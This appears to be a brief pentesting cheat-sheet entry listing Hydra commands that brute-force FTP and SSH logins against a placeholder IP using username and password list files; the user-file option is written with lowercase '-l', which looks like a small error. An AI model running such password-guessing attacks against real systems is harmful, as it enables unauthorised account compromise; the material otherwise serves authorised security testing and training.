1. [Hydra](https://www.kali.org/tools/hydra/)
_FTP
```
hydra -l user.txt -P listPassword.txt ftp://<IP>
```
_SSH
```
hydra -l user.txt -P listPassword.txt <IP> -t 4 ssh
```
